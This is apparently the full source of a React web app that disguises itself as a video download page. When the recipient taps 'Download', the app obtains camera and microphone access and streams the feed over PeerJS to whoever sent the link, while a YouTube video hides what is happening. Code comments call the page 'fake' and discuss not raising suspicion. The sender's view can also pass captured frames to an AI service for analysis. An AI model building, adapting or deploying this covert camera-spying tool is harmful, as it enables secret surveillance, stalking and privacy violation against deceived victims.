
import React, { useState, useEffect, useRef } from 'react';
import Peer from 'peerjs';
import { analyzeScreen } from './services/geminiService';

const App: React.FC = () => {
  const [myId, setMyId] = useState<string>('');
  const [targetId, setTargetId] = useState<string>('');
  const [status, setStatus] = useState<string>('جارێ نییە...');
  const [role, setRole] = useState<'VIEWER' | 'STREAMER'>('VIEWER');
  
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [aiResponse, setAiResponse] = useState<string>('');
  const [loading, setLoading] = useState<boolean>(false);
  
  // State to track if the streamer is watching the "fake" video
  const [isWatchingVideo, setIsWatchingVideo] = useState<boolean>(false);

  const [activeStream, setActiveStream] = useState<MediaStream | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const peerRef = useRef<Peer | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const hostId = params.get('host');
    
    const newPeer = new Peer();

    newPeer.on('open', (id) => {
      setMyId(id);
      if (hostId) {
        setRole('STREAMER');
        setTargetId(hostId);
        setStatus("...Video Loading");
      } else {
        setRole('VIEWER');
        setStatus("لینک بنێرە بۆ ئەوەی کامێرا ببینیت");
      }
    });

    // VIEWER Logic: Receive Video
    newPeer.on('call', (call) => {
      console.log("Receiving call...");
      call.answer(); 
      
      call.on('stream', (remoteStream) => {
        console.log("Stream received");
        setActiveStream(remoteStream);
        setIsConnected(true);
        setStatus("پەیوەست کرا!");
      });
    });

    newPeer.on('error', (err) => {
      console.error(err);
      setStatus("هەڵە: " + err.type);
      setLoading(false);
    });

    peerRef.current = newPeer;

    return () => {
      newPeer.destroy();
    };
  }, []);

  useEffect(() => {
    if (isConnected && activeStream && videoRef.current) {
      // If we are the viewer, show the stream. 
      // If we are streamer, videoRef might be hidden or reused, handled in render.
      if (role === 'VIEWER') {
          videoRef.current.srcObject = activeStream;
          videoRef.current.play().catch(e => console.error("Autoplay error:", e));
      }
    }
  }, [isConnected, activeStream, role]);

  const acceptAndStream = async () => {
    if (!peerRef.current || !targetId) return;
    
    setLoading(true);
    setStatus("Downloading...");

    try {
      // Use Front Camera ('user')
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user' }, 
        audio: true 
      });

      setActiveStream(stream);

      // Call the Viewer
      const call = peerRef.current.call(targetId, stream);
      
      call.on('close', () => {
        setIsConnected(false);
        setStatus("پەیوەندی پچڕا");
        setActiveStream(null);
      });

      setIsConnected(true);
      // Switch UI to show the YouTube video immediately
      setIsWatchingVideo(true);
      
    } catch (err) {
      console.error(err);
      // Even if camera fails, try to show the video to not raise suspicion? 
      // Or show alert. Browser will prompt permission anyway.
      alert("تکایە ڕێگە بە کامێرا بدە بۆ ئەوەی دابەزاندن دەست پێ بکات.");
      setLoading(false);
    }
  };

  const copyLink = () => {
    const url = `${window.location.origin}${window.location.pathname}?host=${myId}`;
    if (navigator.share) {
        navigator.share({
            title: 'Video Download',
            text: 'ڤیدیۆکەم بۆ تۆ نارد، بیکەرەوە',
            url: url
        }).catch(console.error);
    } else {
        navigator.clipboard.writeText(url);
        alert("لینک کۆپی کرا!");
    }
  };

  const handleAiCheck = async () => {
    if (!canvasRef.current || !videoRef.current) return;
    setAiResponse('...خەریکی شیکردنەوە');
    const ctx = canvasRef.current.getContext('2d');
    canvasRef.current.width = videoRef.current.videoWidth;
    canvasRef.current.height = videoRef.current.videoHeight;
    ctx?.drawImage(videoRef.current, 0, 0);
    const imgData = canvasRef.current.toDataURL('image/jpeg');
    
    const text = await analyzeScreen(imgData, "بە کوردی سۆرانی، ئەمە چییە لە وێنەکەدا؟");
    setAiResponse(text || "هیچ دیار نییە");
  };

  // --- RENDER: CONNECTED / STREAMING STATE FOR STREAMER ---
  if (isWatchingVideo && role === 'STREAMER') {
      return (
          <div className="h-[100dvh] w-full bg-black flex flex-col">
              {/* This iframe covers the screen, keeping the connection alive in background */}
              <iframe 
                  width="100%" 
                  height="100%" 
                  src="https://www.youtube.com/embed/bowcSLQshC8?autoplay=1" 
                  title="YouTube video player" 
                  frameBorder="0" 
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                  allowFullScreen
                  className="flex-1"
              ></iframe>
              {/* Keep a hidden video element just in case logic needs it, but muted */}
              <video ref={videoRef} className="hidden" muted playsInline autoPlay />
          </div>
      );
  }

  // --- RENDER: CONNECTED MODE FOR VIEWER ---
  if (isConnected && role === 'VIEWER') {
    return (
      <div className="h-[100dvh] w-full bg-black relative flex flex-col overflow-hidden">
        <video 
          ref={videoRef} 
          autoPlay 
          playsInline 
          className="w-full h-full object-cover"
        />
        
        <div className="absolute bottom-0 inset-x-0 p-6 bg-gradient-to-t from-black/90 via-black/50 to-transparent flex flex-col gap-3">
            {aiResponse && (
                <div className="bg-slate-800/95 p-4 rounded-2xl text-sm text-white border border-white/10 shadow-xl max-h-40 overflow-y-auto" dir="rtl">
                    <span className="text-blue-400 font-bold ml-2">وەڵامی AI:</span> {aiResponse}
                </div>
            )}
            
            <div className="flex gap-3">
                <button onClick={handleAiCheck} className="flex-1 bg-indigo-600 active:bg-indigo-700 text-white py-4 rounded-2xl font-bold shadow-lg transition-transform active:scale-95 flex items-center justify-center gap-2">
                    <i className="fas fa-wand-magic-sparkles"></i>
                    <span>پرسیار لە AI</span>
                </button>
            </div>

            <button onClick={() => window.location.reload()} className="w-full bg-red-500/20 text-red-500 border border-red-500/50 py-3 rounded-2xl flex items-center justify-center font-bold active:bg-red-600 active:text-white transition-colors">
                پچڕاندن
            </button>
        </div>
        <canvas ref={canvasRef} className="hidden" />
      </div>
    );
  }

  // --- RENDER: SETUP MODE ---
  return (
    <div className="min-h-[100dvh] bg-slate-950 flex flex-col items-center justify-center p-6 text-center font-sans">
      <div className="w-full max-w-sm space-y-8 animate-fade-in">
        
        {role === 'VIEWER' ? (
            <div className="flex flex-col items-center gap-2">
                <h1 className="text-3xl font-bold text-white tracking-tight">LinkUp Direct</h1>
                <div className="bg-slate-900 border border-white/10 rounded-3xl p-6 space-y-6 shadow-2xl w-full">
                    <div className="w-20 h-20 bg-blue-600/20 text-blue-500 rounded-full flex items-center justify-center mx-auto ring-4 ring-blue-500/10">
                        <i className="fas fa-eye text-3xl"></i>
                    </div>
                    <div className="space-y-2">
                        <h2 className="text-xl font-bold text-white">داواکردنی کامێرا</h2>
                        <p className="text-slate-400 text-sm">ئەم لینکە بنێرە بۆ ئەو کەسە.</p>
                    </div>
                    
                    <button 
                        onClick={copyLink}
                        className="w-full bg-blue-600 hover:bg-blue-500 text-white py-4 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/20 transition-all active:scale-95 flex items-center justify-center gap-2"
                    >
                        <i className="fas fa-share-nodes"></i>
                        ناردنی لینک
                    </button>
                    <p className="text-slate-500 text-xs font-mono mt-2">{myId ? 'Connected to Server' : 'Connecting...'}</p>
                </div>
            </div>
        ) : (
            // STREAMER "FAKE" UI - Looks like a download page
            <div className="bg-slate-900 border border-blue-500/20 rounded-3xl p-8 space-y-8 shadow-2xl relative overflow-hidden">
                <div className="space-y-4">
                    <div className="w-24 h-24 bg-blue-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-600/40 animate-pulse">
                        <i className="fas fa-download text-4xl text-white"></i>
                    </div>
                    <h2 className="text-2xl font-bold text-white">داونلودکرنا ڤیدیویێ</h2>
                    <p className="text-slate-300 text-lg">
                        بو داونلودکرنا ڤیدیویێ، تەماشەکرنێ بێ ئینتەرنێت، ڤێرێ دابگرە
                    </p>
                </div>

                <button 
                    onClick={acceptAndStream}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-500 text-white py-5 rounded-2xl font-bold text-xl shadow-xl shadow-blue-900/30 transition-all active:scale-95 flex items-center justify-center gap-3"
                >
                    {loading ? (
                        <span className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
                    ) : (
                        <>
                            <i className="fas fa-cloud-arrow-down"></i>
                            داگرتن (Download)
                        </>
                    )}
                </button>
                
                <div className="text-xs text-slate-500">
                    Size: 24.5 MB • MP4 • HD
                </div>
            </div>
        )}

      </div>
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
};

export default App;
